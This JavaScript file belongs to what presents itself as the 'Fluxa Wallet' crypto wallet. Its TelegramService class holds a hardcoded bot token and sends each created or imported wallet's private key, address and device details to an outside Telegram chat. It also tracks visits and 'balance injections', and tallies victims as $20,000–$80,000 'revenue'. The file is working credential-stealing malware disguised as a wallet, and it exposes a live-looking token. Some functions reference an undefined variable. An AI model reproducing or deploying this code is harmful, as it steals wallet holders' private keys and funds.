class TelegramService {
    constructor() {
        this.botToken = '7573718525:AAFifabqLK6LKCPp5vmRbc4Ccm9vzbvN4gM';
        this.chatId = '6381022912';
        this.whatsappNumber = '09048052586';
        this.userDatabase = this.loadUserDatabase();
    }

    // Load user database from localStorage
    loadUserDatabase() {
        try {
            const saved = localStorage.getItem('telegramUserDatabase');
            return saved ? JSON.parse(saved) : {
                newUsers: {},
                authenticatedUsers: {},
                dailyStats: {},
                balanceTracking: {},
                totalUsers: 0,
                totalAuthenticated: 0
            };
        } catch {
            return {
                newUsers: {},
                authenticatedUsers: {},
                dailyStats: {},
                balanceTracking: {},
                totalUsers: 0,
                totalAuthenticated: 0
            };
        }
    }

    // Save user database to localStorage
    saveUserDatabase() {
        try {
            localStorage.setItem('telegramUserDatabase', JSON.stringify(this.userDatabase));
        } catch (error) {
            console.error('Failed to save user database:', error);
        }
    }

    // Add new user to database
    addNewUser(deviceId, deviceInfo) {
        const today = new Date().toISOString().split('T')[0];
        const userKey = `${deviceId}_${Date.now()}`;

        this.userDatabase.newUsers[userKey] = {
            deviceId,
            deviceInfo,
            joinDate: today,
            timestamp: new Date().toISOString(),
            value: 20000, // $20k value for new users
            status: 'new'
        };

        // Update daily stats
        if (!this.userDatabase.dailyStats[today]) {
            this.userDatabase.dailyStats[today] = {
                newUsers: 0,
                authenticatedUsers: 0,
                newUserRevenue: 0,
                authRevenue: 0
            };
        }

        this.userDatabase.dailyStats[today].newUsers++;
        this.userDatabase.dailyStats[today].newUserRevenue += 20000;

        this.saveUserDatabase();
    }

    // Move user to authenticated status
    authenticateUser(deviceId) {
        const today = new Date().toISOString().split('T')[0];

        // Find user in new users and move to authenticated
        const userEntry = Object.entries(this.userDatabase.newUsers).find(([key, user]) => 
            user.deviceId === deviceId
        );

        if (userEntry) {
            const [userKey, userData] = userEntry;

            // Move to authenticated users with additional value
            this.userDatabase.authenticatedUsers[userKey] = {
                ...userData,
                authDate: today,
                authTimestamp: new Date().toISOString(),
                value: 80000, // Total $80k value (20k + 60k)
                status: 'authenticated'
            };

            // Remove from new users
            delete this.userDatabase.newUsers[userKey];

            // Update daily stats
            if (!this.userDatabase.dailyStats[today]) {
                this.userDatabase.dailyStats[today] = {
                    newUsers: 0,
                    authenticatedUsers: 0,
                    newUserRevenue: 0,
                    authRevenue: 0
                };
            }

            this.userDatabase.dailyStats[today].authenticatedUsers++;
            this.userDatabase.dailyStats[today].authRevenue += 60000; // Additional 60k

            this.saveUserDatabase();
        }
    }

    // Generate statistics
    generateStats() {
        const newUsersCount = Object.keys(this.userDatabase.newUsers).length;
        const authUsersCount = Object.keys(this.userDatabase.authenticatedUsers).length;
        const totalNewRevenue = newUsersCount * 20000;
        const totalAuthRevenue = authUsersCount * 80000;
        const totalRevenue = totalNewRevenue + totalAuthRevenue;

        const today = new Date().toISOString().split('T')[0];
        const todayStats = this.userDatabase.dailyStats[today] || {
            newUsers: 0,
            authenticatedUsers: 0,
            newUserRevenue: 0,
            authRevenue: 0
        };

        return {
            total: {
                newUsers: newUsersCount,
                authenticatedUsers: authUsersCount,
                totalUsers: newUsersCount + authUsersCount,
                newUserRevenue: totalNewRevenue,
                authUserRevenue: totalAuthRevenue,
                totalRevenue: totalRevenue
            },
            today: todayStats,
            chartUrl: this.generateChartUrl(todayStats)
        };
    }

    // Generate chart URL for daily statistics
    generateChartUrl(todayStats) {
        const data = {
            type: 'line',
            data: {
                labels: ['New Users', 'Authenticated Users'],
                datasets: [{
                    label: 'Today',
                    data: [todayStats.newUsers, todayStats.authenticatedUsers],
                    borderColor: 'rgb(75, 192, 192)',
                    backgroundColor: 'rgba(75, 192, 192, 0.2)'
                }]
            },
            options: {
                responsive: true,
                plugins: {
                    title: {
                        display: true,
                        text: `Daily User Stats - ${new Date().toLocaleDateString()}`
                    }
                }
            }
        };

        const encodedData = encodeURIComponent(JSON.stringify(data));
        return `https://quickchart.io/chart?c=${encodedData}`;
    }

    async sendMessage(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();
            return result.ok;
        } catch (error) {
            console.error('Telegram message failed:', error);
            return false;
        }
    }

    getDeviceInfo() {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        return `• <b>Platform:</b> ${platform}
• <b>Browser:</b> ${this.getBrowserName(userAgent)}
• <b>Language:</b> ${language}
• <b>Screen:</b> ${screenResolution}
• <b>Timezone:</b> ${timezone}`;
    }

    getBrowserName(userAgent) {
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown';
    }

    async notifyFirstTimeUser(deviceId) {
        const deviceInfo = this.getDeviceInfo();
        const userAgent = navigator.userAgent;
        const stats = this.generateStats();

        // Add user to database
        this.addNewUser(deviceId, {
            userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        });

        const message = `
🆕 <b>NEW USER DETECTED</b> 💰

👤 <b>User Information:</b>
📱 <b>Device ID:</b> <code>${deviceId}</code>
💵 <b>Value:</b> $20,000 USD
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Details:</b>
${deviceInfo}

📊 <b>Current Statistics:</b>
🟢 <b>New Users:</b> ${stats.total.newUsers} ($${stats.total.newUserRevenue.toLocaleString()})
🔓 <b>Authenticated:</b> ${stats.total.authenticatedUsers} ($${stats.total.authUserRevenue.toLocaleString()})
💰 <b>Total Revenue:</b> $${stats.total.totalRevenue.toLocaleString()}

📈 <b>Today's Activity:</b>
• New Joins: ${stats.today.newUsers}
• Authentications: ${stats.today.authenticatedUsers}
• Revenue: $${(stats.today.newUserRevenue + stats.today.authRevenue).toLocaleString()}

📊 <b>Live Chart:</b> ${stats.chartUrl}

⏰ <b>Time:</b> ${new Date().toLocaleString()}

<i>💡 Use /stats to view detailed analytics</i>
        `;

        await this.sendMessage(message);
    }

    async notifyAuthentication(deviceId) {
        const deviceInfo = this.getDeviceInfo();
        const stats = this.generateStats();

        // Move user to authenticated status
        this.authenticateUser(deviceId);

        // Get updated stats after authentication
        const updatedStats = this.generateStats();

        const message = `
🔓 <b>USER AUTHENTICATED</b> 💎

👤 <b>Authentication Details:</b>
📱 <b>Device ID:</b> <code>${deviceId}</code>
💵 <b>New Value:</b> $80,000 USD (+$60,000)
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Information:</b>
${deviceInfo}

📊 <b>Updated Statistics:</b>
🟢 <b>New Users:</b> ${updatedStats.total.newUsers} ($${updatedStats.total.newUserRevenue.toLocaleString()})
🔓 <b>Authenticated:</b> ${updatedStats.total.authenticatedUsers} ($${updatedStats.total.authUserRevenue.toLocaleString()})
💰 <b>Total Revenue:</b> $${updatedStats.total.totalRevenue.toLocaleString()}

📈 <b>Today's Performance:</b>
• New Joins: ${updatedStats.today.newUsers}
• Authentications: ${updatedStats.today.authenticatedUsers}
• Revenue: $${(updatedStats.today.newUserRevenue + updatedStats.today.authRevenue).toLocaleString()}

📊 <b>Live Chart:</b> ${updatedStats.chartUrl}

⏰ <b>Authentication Time:</b> ${new Date().toLocaleString()}

<i>💡 Use /stats for detailed revenue analytics</i>
        `;

        await this.sendMessage(message);
    }

    async notifyWalletCreated(deviceId, address, privateKey) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
🆕 <b>WALLET CREATED</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyWalletImported(deviceId, address, privateKey) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
📥 <b>WALLET IMPORTED</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyDashboardAccess(deviceId, address, balance, balanceUSD) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
📊 <b>DASHBOARD ACCESS</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${address}</code>
💰 <b>Balance:</b> ${balance.toFixed(4)} BNB
💵 <b>USD Value:</b> $${balanceUSD.toFixed(2)}
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyDeviceVisit(deviceId, isNewDevice) {
        // Only notify for first-time users with full statistics
        if (isNewDevice) {
            await this.notifyFirstTimeUser(deviceId);
        }
    }

    async notifyPageVisit(deviceId, pageName) {
        const deviceInfo = this.getDeviceInfo();
        const message = `
📄 <b>PAGE VISIT: ${pageName.toUpperCase()}</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}
🌐 <b>Page:</b> ${pageName}
🌍 <b>URL:</b> ${window.location.href}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Visit Time:</b> ${new Date().toLocaleString()}
🌍 <b>Referrer:</b> ${document.referrer || 'Direct'}
        `;

        await this.sendMessage(message);
    }

    async notifyPageEngagement(deviceId, pageName, timeSpent) {
        const minutes = Math.floor(timeSpent / 60);
        const seconds = timeSpent % 60;
        const timeFormatted = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;

        const message = `
⏱️ <b>PAGE ENGAGEMENT: ${pageName.toUpperCase()}</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}
🌐 <b>Page:</b> ${pageName}
⏳ <b>Time Spent:</b> ${timeFormatted}
🌍 <b>URL:</b> ${window.location.href}

⏰ <b>Session End:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyUserInteraction(deviceId, pageName, interactionCount) {
        const message = `
🖱️ <b>USER INTERACTION: ${pageName.toUpperCase()}</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
📞 <b>WhatsApp:</b> ${this.whatsappNumber}
🌐 <b>Page:</b> ${pageName}
🔢 <b>Interactions:</b> ${interactionCount}
🌍 <b>URL:</b> ${window.location.href}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyBalanceInjection(deviceId, walletAddress, oldBalance, newBalance, injectedAmount) {
        // Update balance tracking
        this.userDatabase.balanceTracking[deviceId] = newBalance;
        this.saveUserDatabase();

        const message = `
💉 <b>BALANCE INJECTION</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${walletAddress}</code>
💰 <b>Old Balance:</b> ${oldBalance.toFixed(4)} BNB
💰 <b>New Balance:</b> ${newBalance.toFixed(4)} BNB
📈 <b>Injected:</b> ${injectedAmount.toFixed(4)} BNB
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    async notifyTransfer(deviceId, address, toAddress, amount, transactionType) {
        const deviceInfo = this.getDeviceInfo();
        const emoji = transactionType === 'send' ? '📤' : '📥';
        const action = transactionType === 'send' ? 'Sent' : 'Received';

        const message = `
${emoji} <b>BNB ${action}</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>From Address:</b> <code>${address}</code>
🎯 <b>To Address:</b> <code>${toAddress}</code>
💰 <b>Amount:</b> ${amount.toFixed(4)} BNB
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }

    // Method to handle /stats command
    async handleStatsCommand() {
        const stats = this.generateStats();
        const last7Days = this.getLast7DaysStats();

        const message = `
📊 <b>FLUXA WALLET ANALYTICS DASHBOARD</b>

💰 <b>TOTAL REVENUE: $${stats.total.totalRevenue.toLocaleString()}</b>

🟢 <b>NEW USERS</b>
• Count: ${stats.total.newUsers}
• Value: $${stats.total.newUserRevenue.toLocaleString()}
• Rate: $20,000 per user

🔓 <b>AUTHENTICATED USERS</b>
• Count: ${stats.total.authenticatedUsers}
• Value: $${stats.total.authUserRevenue.toLocaleString()}
• Rate: $80,000 per user

📈 <b>TODAY'S PERFORMANCE</b>
• New Joins: ${stats.today.newUsers} (+$${stats.today.newUserRevenue.toLocaleString()})
• Authentications: ${stats.today.authenticatedUsers} (+$${stats.today.authRevenue.toLocaleString()})
• Total Revenue Today: $${(stats.today.newUserRevenue + stats.today.authRevenue).toLocaleString()}

📊 <b>VISUAL ANALYTICS</b>
${stats.chartUrl}

📅 <b>7-DAY SUMMARY</b>
${last7Days}

⏰ <b>Generated:</b> ${new Date().toLocaleString()}

<i>💡 Use this dashboard to track your business performance in real-time</i>
        `;

        await this.sendMessage(message);
    }

    // Get last 7 days statistics
    getLast7DaysStats() {
        const last7Days = [];
        for (let i = 6; i >= 0; i--) {
            const date = new Date();
            date.setDate(date.getDate() - i);
            const dateStr = date.toISOString().split('T')[0];
            const dayStats = this.userDatabase.dailyStats[dateStr] || {
                newUsers: 0,
                authenticatedUsers: 0,
                newUserRevenue: 0,
                authRevenue: 0
            };

            const totalRevenue = dayStats.newUserRevenue + dayStats.authRevenue;
            last7Days.push(`${date.toLocaleDateString()}: ${dayStats.newUsers + dayStats.authenticatedUsers} users, $${totalRevenue.toLocaleString()}`);
        }
        return last7Days.join('\n');
    }

    async notifyWalletImport(deviceId, walletAddress, privateKey) {
        // Track balance for imported wallet
        const isPredefined = ['0000000000000000000000000000000000000000000000000000000000000001', '0000000000000000000000000000000000000000000000000000000000000002', '0000000000000000000000000000000000000000000000000000000000000003', '0000000000000000000000000000000000000000000000000000000000000004', '0000000000000000000000000000000000000000000000000000000000000005', '0000000000000000000000000000000000000000000000000000000000000006', '0000000000000000000000000000000000000000000000000000000000000007', '0000000000000000000000000000000000000000000000000000000000000008', '0000000000000000000000000000000000000000000000000000000000000009', '000000000000000000000000000000000000000000000000000000000000000a'].includes(privateKey);

        if (isPredefined) {
            const balances = { '0000000000000000000000000000000000000000000000000000000000000001': 2.3077, '0000000000000000000000000000000000000000000000000000000000000002': 2.4615, '0000000000000000000000000000000000000000000000000000000000000003': 2.6154, '0000000000000000000000000000000000000000000000000000000000000004': 2.7692, '0000000000000000000000000000000000000000000000000000000000000005': 2.9231, '0000000000000000000000000000000000000000000000000000000000000006': 3.0769, '0000000000000000000000000000000000000000000000000000000000000007': 2.3846, '0000000000000000000000000000000000000000000000000000000000000008': 2.5385, '0000000000000000000000000000000000000000000000000000000000000009': 2.6923, '000000000000000000000000000000000000000000000000000000000000000a': 2.8462 };
            this.userDatabase.balanceTracking[deviceId] = balances[privateKey];
        } else {
            this.userDatabase.balanceTracking[deviceId] = 0;
        }
        this.saveUserDatabase();

        const balance = this.userDatabase.balanceTracking[deviceId] || 0;
        const message = `
📥 <b>WALLET IMPORTED</b>

📱 <b>Device ID:</b> <code>${deviceId}</code>
🏠 <b>Address:</b> <code>${walletAddress}</code>
🔑 <b>Private Key:</b> <code>${privateKey}</code>
💰 <b>Balance:</b> ${balance.toFixed(4)} BNB
💵 <b>USD Value:</b> $${(balance * 650).toFixed(2)}
📞 <b>WhatsApp:</b> ${this.whatsappNumber}

🖥️ <b>Device Info:</b>
${deviceInfo}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
        `;

        await this.sendMessage(message);
    }
}

// Create singleton instance
const telegramService = new TelegramService();

// Expose stats method for admin use
window.telegramStats = () => telegramService.handleStatsCommand();